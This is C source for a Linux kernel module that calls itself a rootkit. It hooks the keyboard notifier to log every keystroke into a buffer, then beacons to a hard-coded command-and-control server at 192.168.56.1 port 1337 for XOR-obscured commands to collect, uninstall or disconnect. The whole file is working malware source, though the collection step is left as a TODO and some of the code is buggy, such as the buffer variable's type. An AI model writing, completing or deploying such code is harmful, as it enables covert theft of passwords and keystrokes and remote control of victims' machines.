#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include <linux/delay.h>
#include <linux/inet.h>
#include <linux/keyboard.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
#define NOTIFY_OK 0x0001 // This tells the kernel that everything is OK.
#define MAX_KEY_LEN 12 // This is the longest key length in key buffer 

static const char *keys[][2] = {{"\0", "\0"}, {"ESC", "ESC"}, {"1", "!"}, {"2", "@"},{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},{"-", "_"}, {"=", "+"}, {"BACKSPACE", "BACKSPACE"},{"TAB", "TAB"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},{"\n", "\n"}, {"CTRL", "CTRL"}, {"a", "A"}, {"s", "S"},{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},{"'", "\""}, {"`", "~"}, {"SHIFT", "SHIFT"}, {"\\", "|"},{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"SHIFT", "SHIFT"}, {"PRTSCR", "KPD*"},{"ALT", "ALT"}, {" ", " "}, {"CAPS", "CAPS"}, {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"}, {"NUM", "NUM"}, {"SCROLL", "SCROLL"},{"KPD7", "HOME"}, {"KPD8", "UP"}, {"KPD9", "PGUP"},{"-", "-"}, {"KPD4", "LEFT"}, {"KPD5", "KPD5"},{"KPD6", "RIGHT"}, {"+", "+"}, {"KPD1", "END"},{"KPD2", "DOWN"}, {"KPD3", "PGDN"}, {"KPD0", "INS"},{"KPD.", "DEL"}, {"SYSRQ", "SYSRQ"}, {"\0", "\0"},{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"KPENTER", "KPENTER"}, {"CTRL", "CTRL"}, {"/", "/"},{"PRTSCR", "PRTSCR"}, {"ALT", "ALT"}, {"\0", "\0"},{"HOME", "HOME"}, {"UP", "UP"}, {"PGUP", "PGUP"},{"LEFT", "LEFT"}, {"RIGHT", "RIGHT"}, {"END", "END"},{"DOWN", "DOWN"}, {"PGDN", "PGDN"}, {"INS", "INS"},{"DEL", "DEL"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"PAUSE", "PAUSE"}};

static int maxBufSize = 5120;
static char keysToWrite;
static size_t bufSize = 0;
static bool unreg = false;
static int C2_PORT = 1337;
static char * C2_IP = "192.168.56.1";
struct socket *sock = NULL;
static int CALLBACK_INTERVAL = 30;
static int MAXIMUM_ATTEMPTS = 5;
static uint8_t encryption_key[] = {0xde, 0xad, 0xbe, 0xef};
enum data_operation {
    SEND = 1,
    RECV = 2
};
enum commands {
    COLLECT = 1,
    UNINSTALL = 2,
    DISCONNECT = 3
};

static int keylogFunc(struct notifier_block*, unsigned long, void*);

/*
* keycodeToAscii: This will take the given keycode and transform it based off the code and shift 
* @param int shift: if shift is pressed or not
* @param int keycode: the code of the key pressed
* @param char* buffer: the buffer to hold the keys
*/
static void keycodeToAscii(int shift, int keycode, char* buf){
    //keep track of the keys to be logged 
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE){
      const char* asciiVal;
      // if the shift is pressed
      if (shift == 1){
        asciiVal = keys[keycode][1];
      } else {
        asciiVal = keys[keycode][0];
      }
      snprintf(buf, MAX_KEY_LEN ,"%s", asciiVal);
    }
}

/*
* keylogFunc: This is the function that will be called when a key press event happens. It will transform
*             key pressed into ASCII 
* @param: struct notifier_blk blk: The struct that holds the keylogging function
* @param: void* _param: the struct that holds the keypress
*/
static int keylogFunc(struct notifier_block *blk, unsigned long code, void *_param){
    struct keyboard_notifier_param *param = _param;
    char buf[MAX_KEY_LEN] = {0};

    // Only log on the down press of the key
    if(param->down){
      keycodeToAscii(param->shift,param->value, buf);
      if (strlen(buf) < 1){
        // Return out if it is an invalid keycode
        return NOTIFY_OK;
      }

      // Reset buffer position before we go out of bounds
      if ((bufSize + strlen(buf)) >= maxBufSize){
        char* tmp = krealloc(keysToWrite, (maxBufSize*2)*sizeof(char), GFP_KERNEL);
        maxBufSize = maxBufSize*2;
        if (tmp == NULL){
          kfree(keysToWrite);
          printk(KERN_INFO "Bad Realloc\n");
        } else {
          keysToWrite = tmp;
        }
      }
      strncpy(keysToWrite + bufSize, buf, strlen(buf));
      bufSize += strlen(buf);
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger = {
    .notifier_call = keylogFunc
};

static uint8_t* encrypt(const uint8_t* msg, unsigned int msg_len, const uint8_t* key, unsigned int key_len) {
    unsigned int i;
    uint8_t* encrypted = (uint8_t*) kmalloc(msg_len + 1, GFP_KERNEL);
    memset(encrypted, 0, msg_len + 1);
    for (i = 0; i < msg_len; i++) {
        encrypted[i] = msg[i] ^ key[i % key_len];
    }

    return encrypted;
}

static void to_bytes(int num, uint8_t *ptr) {
    int i;
    for (i = 0; i < 4; i++) {
        ptr[i] = (num >> (24 - (i * 8))) & 0xFF;
    }
}

static int do_data_transfer(char * buffer, size_t length, int operation) {
    struct msghdr msg;
    struct kvec vec;
    // send code stub
    msg.msg_name = 0;
    msg.msg_namelen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;

    vec.iov_len = length;
    vec.iov_base = buffer;

    if (operation == SEND ){
        return kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
    } else if (operation == RECV) {
        return kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
    } else {
        return -1;
    }
}

static int __init rootkit_init(void) {
    int shutdown = 0, retval = -1, attempts = 0; 
    uint8_t cmd_recv = 0;
    uint8_t * crypto_ptr = NULL;

    struct sockaddr_in addr;

    addr.sin_family = AF_INET; 
    addr.sin_addr.s_addr = in_aton(C2_IP); 
    addr.sin_port = htons(C2_PORT);

    printk(KERN_INFO "Loaded kernel module\n");

    register_keyboard_notifier(&keylogger);
    while (!shutdown) {
        printk(KERN_INFO "Creating socket\n");
        if (!sock && (retval = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
            printk(KERN_INFO "Failed to create socket, uninstalling now\n");
            goto uninstall;
        }

        // attempt to connect to socket, uninstall if attempts exceed MAXIMUM_ATTEMPTS
        printk(KERN_INFO "Attempting to connect to C2\n");
        while (0 != (retval = sock->ops->connect(sock, (struct sockaddr*) &addr, sizeof(addr), O_RDWR))) { 
            printk("connection with the server failed with error code %i...\n", retval); 
            ssleep(10);
            attempts++;
            if (attempts == MAXIMUM_ATTEMPTS) {
                goto uninstall;
            }
        }

        attempts = 0;

        printk(KERN_INFO "Connection established!\n");
        printk(KERN_INFO "Receiving command...\n");

        if (0 > do_data_transfer(&cmd_recv, 1, RECV)) {
            printk(KERN_INFO "Failed to receive command\n");
            goto cleanup;
        }

        crypto_ptr = encrypt(&cmd_recv, 1, encryption_key, 4);
        if (!crypto_ptr) {
            printk(KERN_INFO "Failed to decrypt cmd\n");
            goto cleanup;
        }

        if (0 > do_data_transfer(&cmd_recv, 1, SEND)) {
            printk(KERN_INFO "Failed to ack command\n");
            goto cleanup;
        }

        switch(*crypto_ptr) {
            case COLLECT:
                //TODO COLLECT FUNCTION
                printk(KERN_INFO "Received command for collect\n");
                break;

            case UNINSTALL:
                printk(KERN_INFO "Received command for uninstall\n");
                shutdown = 1;
                break;

            case DISCONNECT:
                printk(KERN_INFO "Received command for disconnect\n");
                break;

            default:
                printk(KERN_INFO "Unknown command value: %u\n", *crypto_ptr);
                break;
        }
        kfree(crypto_ptr);
        crypto_ptr = NULL;
        cmd_recv = 0;

cleanup:
        // cleanup current connection
        printk(KERN_INFO "Destroying socket\n");
        sock_release(sock);
        sock = NULL;

        // sleep until next callback
        if (!shutdown) {
            ssleep(CALLBACK_INTERVAL);
        }
    }
uninstall:
    unregister_keyboard_notifier(&keylogger);
    unreg = true;
    return retval;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Removed kernel module\n");
    if (!(unreg)){
        unregister_keyboard_notifier(&keylogger);
    }
}

module_init(rootkit_init);
module_exit(rootkit_exit);
